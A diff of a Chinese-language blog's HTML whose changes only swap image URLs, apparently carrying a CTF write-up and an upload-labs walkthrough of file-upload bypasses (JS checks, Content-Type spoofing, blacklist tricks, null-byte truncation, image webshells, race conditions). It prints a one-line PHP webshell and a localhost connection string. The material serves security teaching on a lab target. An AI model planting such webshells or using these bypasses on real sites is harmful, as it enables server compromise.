 <p>到rar包的解压密码：<strong>0ac1fe6b77be5dbe</strong></p>
 <p>解压可以得到一个zip包，看zip包里的内容(里面都是xml)可以知道这是一个 <strong>docx</strong> 文件，改后缀为docx得到最终的文件。</p>
 <p>将文件内容全选改为深色，可以看到在文档的最下方藏有几串字符</p>
-<img src="http://img.kawhi.xyz/image-20200424212849538.png" alt="image-20200424212849538" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424212849538.png" alt="image-20200424212849538" style="high:80%;width:80%;" />
 
 <p>再base64解密：</p>
-<img src="http://img.kawhi.xyz/image-20200424212915052.png" alt="image-20200424212915052" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424212915052.png" alt="image-20200424212915052" style="high:80%;width:80%;" />
 
 <h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a><strong>ezpop</strong></h3><p>首先说一下</p>
 <p>PHP类中的<code>__get</code>和<code>__set</code>函数。</p>
@@ -3518,7 +3520,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <p>1.首先打开burp和浏览器</p>
 <p>2.上传1.php文件进行观察</p>
 <p>3.这里发现，http请求都没通过burp就弹出了不允许上传的提示框，这表明验证点在前端，而不在服务端</p>
-<img src="http://img.kawhi.xyz/image-20200502124534442.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200502124534442.png" style="high:100%;width:100%;" />
 
 <p>这里可以按F12查看源码：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file = document.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == null || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">    //定义允许上传的文件类型</span><br><span class="line">    var allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    //提取上传文件的类型</span><br><span class="line">    var ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    //判断上传文件类型是否允许上传</span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">        var errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -3526,14 +3528,14 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <p>可以看到，上传之前，通过js判断一下文件后缀是否为<code>.jpg</code>|<code>.png</code>|<code>.gif</code>,不是就不允许上传。</p>
 <p><strong>绕过方法：</strong></p>
 <p>前端js验证的绕过，我们可以将上传的php文件改后缀名为<code>jpg</code>|<code>png</code>|<code>gif</code>,绕过js验证后，再用burp更改上传请求。</p>
-<img src="http://img.kawhi.xyz/image-20200502125214737.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200502125214737.png" style="high:100%;width:100%;" />
 
 <p>然后再点forword放行请求：</p>
-<img src="http://img.kawhi.xyz/image-20200502125346077.png" style="high:30%;width:30%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200502125346077.png" style="high:30%;width:30%;" />
 
 <p>可以看到<code>1.php</code>已经成功上传。</p>
 <p>再用蚁剑连接即可：</p>
-<img src="http://img.kawhi.xyz/image-20200502125541669.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200502125541669.png" style="high:100%;width:100%;" />
 
 <h4 id="Pass-02-验证Content-type"><a href="#Pass-02-验证Content-type" class="headerlink" title="Pass-02(验证Content-type)"></a><strong>Pass-02(验证Content-type)</strong></h4><p>看源码：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -3541,7 +3543,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <p>后端php代码只对<code>Content-Type</code>进行了检查。</p>
 <p><strong>绕过方法：</strong></p>
 <p>直接在burp修改<code>content-type</code>为允许的类型。</p>
-<img src="http://img.kawhi.xyz/image-20200502180337105.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200502180337105.png" style="high:100%;width:100%;" />
 
 <h4 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03(黑名单绕过)"></a><strong>Pass-03(黑名单绕过)</strong></h4><p>首先看一下源码：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -3573,7 +3575,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <p>所以此处可以利用windows系统的命名规则进行绕过。</p>
 <p>windows下<code>xx.jpg[空格]</code> 或<code>xx.jpg.</code>这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点。</p>
 <p>此处会删除末尾的点，但是没有去掉末尾的空格，因此上传一个<code>.php[空格]</code>文件即可。</p>
-<img src="http://img.kawhi.xyz/image-20200502225824112.png" style="high:70%;width:70%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200502225824112.png" style="high:70%;width:70%;" />
 
 <h4 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07(点绕过)"></a><strong>Pass-07(点绕过)</strong></h4><p>源代码：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -3614,7 +3616,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <li>php.ini的<code>magic_quotes_gpc</code>为OFF状态</li>
 </ul>
 <p><strong>绕过方法：</strong></p>
-<img src="http://img.kawhi.xyz/image-20200503111752571.png" style="high:70%;width:70%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503111752571.png" style="high:70%;width:70%;" />
 
 <h4 id="Pass-12-00截断post"><a href="#Pass-12-00截断post" class="headerlink" title="Pass-12(00截断post)"></a><strong>Pass-12(00截断post)</strong></h4><p>源代码：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = array(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -3622,13 +3624,13 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <p>这里同样是白名单。</p>
 <p>和十一关不同的是这次的<code>save_path</code>是通过<code>post</code>传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为<code>post</code>不会像<code>get</code>对<code>%00</code>进行自动解码。</p>
 <p><strong>绕过方法：</strong></p>
-<img src="http://img.kawhi.xyz/image-20200503113855012.png" style="high:70%;width:70%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503113855012.png" style="high:70%;width:70%;" />
 
 <h4 id="Pass-13-图片马"><a href="#Pass-13-图片马" class="headerlink" title="Pass-13(图片马)"></a><strong>Pass-13(图片马)</strong></h4><p>源码是：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function getReailFileType($filename)&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); //只读<span class="number">2</span>字节</span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">&quot;C2chars&quot;</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">&#x27;chars1&#x27;</span>].$strInfo[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    $fileType = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    switch($typeCode)&#123;      </span><br><span class="line">        case <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        case <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        case <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        default:            </span><br><span class="line">            $fileType = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>题目描述为：</p>
-<img src="http://img.kawhi.xyz/image-20200503161224229.png" style="high:70%;width:70%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503161224229.png" style="high:70%;width:70%;" />
 
 <p>从上面的代码可以看出来，将上传的文件读取先读取两字节，通过对比文件头来确认文件类型。于是就可以制作图片马，将php语句隐藏在图片中，然后结合文件包含漏洞执行php。</p>
 <p><strong>绕过方法：</strong></p>
@@ -3637,11 +3639,11 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 
 <p>生成图片马后上传。</p>
 <p>然后打开文件包含漏洞页面。这里的原理是<code>include</code>函数会试图解析读取的内容，是否为php代码，如若是则执行，否则直接输出。</p>
-<img src="http://img.kawhi.xyz/image-20200503161934822.png" style="high:90%;width:90%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503161934822.png" style="high:90%;width:90%;" />
 
 <p>当然页面是只能看到图片的代码，php代码是看不到的。</p>
 <p>用蚁剑测试一下，成功连接上</p>
-<img src="http://img.kawhi.xyz/image-20200503162147838.png" style="high:90%;width:90%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503162147838.png" style="high:90%;width:90%;" />
 
 <h4 id="Pass-14-getimagesize图片马"><a href="#Pass-14-getimagesize图片马" class="headerlink" title="Pass-14(getimagesize图片马)"></a><strong>Pass-14(getimagesize图片马)</strong></h4><p>源码为：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    $types = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -3667,18 +3669,18 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <p>这里把<code>move_uploaded_file</code>这个判断条件去除,然后尝试上传图片马。</p>
 <p><strong>上传gif:</strong></p>
 <p>首先将一句话木马添加到<code>1.gif</code>的文件尾</p>
-<img src="http://img.kawhi.xyz/image-20200503173331981.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503173331981.png" style="high:80%;width:80%;" />
 
 <p>然后将上传的gif下载下来，是经过二次渲染的文件<code>28278.gif</code>，用010打开：</p>
-<img src="http://img.kawhi.xyz/image-20200503173427515.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503173427515.png" style="high:80%;width:80%;" />
 
 <p>可以发现，在gif末端添加的php代码已经被去除。</p>
 <p>绕过gif的二次渲染，只需要找到渲染前后没有变化的位置，然后将php代码写进去，就可以成功上传带有php代码的图片了。</p>
-<img src="http://img.kawhi.xyz/image-20200503173827659.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503173827659.png" style="high:80%;width:80%;" />
 
 <p>发现蓝色部分都是没有变化的，于是将一句话写在末尾。</p>
 <p>上传之后再下载下来，发现并没有被清除。</p>
-<img src="http://img.kawhi.xyz/image-20200503174017083.png" style="high:90%;width:90%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503174017083.png" style="high:90%;width:90%;" />
 
 <p>成功连接上。</p>
 <p><strong>上传png：</strong></p>
@@ -3688,18 +3690,18 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 
 <p>直接运行后得到1.png</p>
 <p>上传之后再下载下来可以看到php代码还在</p>
-<img src="http://img.kawhi.xyz/image-20200503212308794.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503212308794.png" style="high:80%;width:80%;" />
 
 <p>这里的一句话木马是：</p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?=$_GET[0]($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>首先 <code>?=$_GET[0]</code> 指的是让你以 0 为参数进行传参，其次 <code>$_POST[1]</code> 指的是用 1 来接收提交上来的参数。</p>
-<img src="http://img.kawhi.xyz/image-20200503212501216.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503212501216.png" style="high:80%;width:80%;" />
 
 <p>还可连接中国菜刀，这里很奇怪的是连接不了蚁剑。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url:http://127.0.0.1/upload-labs/include.php?file=./upload/6116.png&amp;0=assert</span><br><span class="line">密码：<span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-<img src="http://img.kawhi.xyz/image-20200503212720089.png" style="high:60%;width:60%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503212720089.png" style="high:60%;width:60%;" />
 
 <p><strong>上传jpg：</strong></p>
 <p>未能复现成功</p>
@@ -3710,23 +3712,23 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <p><strong>绕过方法：</strong></p>
 <p>用burp开启两个intruder模块，一个用于重复上传，另一个用于重复访问。</p>
 <p><strong>重复上传</strong></p>
-<img src="http://img.kawhi.xyz/image-20200503201243378.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503201243378.png" style="high:100%;width:100%;" />
 
 <p><strong>重复请求</strong></p>
-<img src="http://img.kawhi.xyz/image-20200503201409484.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503201409484.png" style="high:100%;width:100%;" />
 
 <p>设置一下访问次数</p>
-<img src="http://img.kawhi.xyz/image-20200503201454724.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503201454724.png" style="high:100%;width:100%;" />
 
 <p>然后同时开启爆破</p>
-<img src="http://img.kawhi.xyz/image-20200503201551566.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200503201551566.png" style="high:100%;width:100%;" />
 
 <p>可以看到已经成功访问php的配置信息。</p>
 <h4 id="Pass-19-绕过"><a href="#Pass-19-绕过" class="headerlink" title="Pass-19(/.绕过)"></a><strong>Pass-19(/.绕过)</strong></h4><p>源代码为：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span 